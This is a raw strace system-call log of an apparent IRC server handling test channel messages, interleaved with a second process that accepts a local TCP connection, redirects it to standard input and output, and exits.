4519  07:15:42.901819 gettimeofday({1495624542, 901823}, NULL) = 0
4519  07:15:42.901847 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:42.901876 clock_gettime(CLOCK_MONOTONIC, {1352, 718889876}) = 0
4519  07:15:42.901889 gettimeofday({1495624542, 901893}, NULL) = 0
4519  07:15:42.901900 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 2 (in [4 7], left {1, 0})
4519  07:15:42.901940 clock_gettime(CLOCK_MONOTONIC, {1352, 718952687}) = 0
4519  07:15:42.901951 recv(7, "PRIVMSG  #testit2 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\n", 8192, 0) = 55
4519  07:15:42.901993 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902042 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902074 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902105 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902118 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902132 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902145 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902159 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902172 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902186 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902199 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902212 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902226 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902239 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902252 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902266 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902279 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902292 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902306 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902321 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902335 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902348 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902367 recv(4, "PRIVMSG  #testit ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 70
4519  07:15:42.902386 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902401 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902414 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902428 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902441 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902455 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902468 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902493 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902536 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902569 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902599 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902613 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902630 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902643 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902657 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902670 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902683 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902697 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902710 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902724 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902737 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902750 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:42.902766 gettimeofday({1495624542, 902770}, NULL) = 0
4519  07:15:42.902777 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
6824  07:15:43.350115 <... accept resumed> {sa_family=AF_INET, sin_port=htons(40477), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
6824  07:15:43.350160 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c198) = -1 EINVAL (Invalid argument)
6824  07:15:43.350177 _llseek(8, 0, 0xbf80c1e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:43.350190 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80c198) = -1 EINVAL (Invalid argument)
6824  07:15:43.350201 _llseek(8, 0, 0xbf80c1e0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:43.350247 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
6824  07:15:43.350307 close(6)          = 0
6824  07:15:43.350377 dup(8)            = 6
6824  07:15:43.350390 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d038) = -1 EINVAL (Invalid argument)
6824  07:15:43.350402 _llseek(6, 0, 0xbf80d080, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:43.350413 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6824  07:15:43.350432 dup2(6, 1)        = 1
6824  07:15:43.350444 close(6)          = 0
6824  07:15:43.350456 fcntl64(1, F_SETFD, 0) = 0
6824  07:15:43.350467 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d008) = -1 EINVAL (Invalid argument)
6824  07:15:43.350477 _llseek(1, 0, 0xbf80d050, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:43.350506 dup(8)            = 6
6824  07:15:43.350519 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf80d038) = -1 EINVAL (Invalid argument)
6824  07:15:43.350529 _llseek(6, 0, 0xbf80d080, SEEK_CUR) = -1 ESPIPE (Illegal seek)
6824  07:15:43.350539 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
6824  07:15:43.350556 dup2(6, 0)        = 0
6824  07:15:43.350566 close(6)          = 0
6824  07:15:43.350576 fcntl64(0, F_SETFD, 0) = 0
6824  07:15:43.350590 fcntl64(0, F_SETFD, 0) = 0
6824  07:15:43.350604 read(0,  <unfinished ...>
4519  07:15:43.350944 <... select resumed> ) = 1 (in [5], left {0, 550000})
4519  07:15:43.350968 clock_gettime(CLOCK_MONOTONIC, {1353, 167982195}) = 0
4519  07:15:43.350983 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:15:43.350997 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:15:43.351019 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:15:43.351035 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:15:43.351061 close(5)          = 0
4519  07:15:43.351075 time(NULL)        = 1495624543
4519  07:15:43.351085 time(NULL)        = 1495624543
4519  07:15:43.351099 gettimeofday({1495624543, 351103}, NULL) = 0
4519  07:15:43.351112 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:43.351141 clock_gettime(CLOCK_MONOTONIC, {1353, 168154086}) = 0
4519  07:15:43.351152 gettimeofday({1495624543, 351155}, NULL) = 0
4519  07:15:43.351162 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 600000})
4519  07:15:43.747770 clock_gettime(CLOCK_MONOTONIC, {1353, 564779061}) = 0
4519  07:15:43.747770 recv(7, "PRIVMSG  #testit2 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\n", 8192, 0) = 59
4519  07:15:43.747770 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747771 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747772 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747772 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747783 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747796 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747810 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747823 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747837 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747850 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747863 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747877 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747890 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747919 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747960 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.747991 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.748004 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.748017 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.748034 gettimeofday({1495624543, 748038}, NULL) = 0
4519  07:15:43.748046 select(1024, [2 3 4 7 9], [], NULL, {1, 0}) = 1 (in [7], left {0, 950000})
4519  07:15:43.797946 clock_gettime(CLOCK_MONOTONIC, {1353, 614965355}) = 0
4519  07:15:43.797966 recv(7, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 45
4519  07:15:43.797985 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798001 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798015 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798029 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798042 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798056 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798069 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798083 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798096 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798109 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798123 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798136 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798149 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798163 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798176 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798189 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798202 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798216 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798234 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798248 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798262 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798275 getrusage(RUSAGE_SELF, {ru_utime={0, 0}, ru_stime={0, 170000}, ...}) = 0
4519  07:15:43.798302 time(NULL)        = 1495624543
4519  07:15:43.798339 time(NULL)        = 1495624543
4519  07:15:43.798350 gettimeofday({1495624543, 798354}, NULL) = 0
4519  07:15:43.798378 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:15:43.798406 clock_gettime(CLOCK_MONOTONIC, {1353, 615419051}) = 0
4519  07:15:43.798416 gettimeofday({1495624543, 798420}, NULL) = 0
4519  07:15:43.798427 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
6824  07:15:43.873025 <... read resumed> "", 4096) = 0
6824  07:15:43.873249 close(8)          = 0
6824  07:15:43.873425 exit_group(0)     = ?
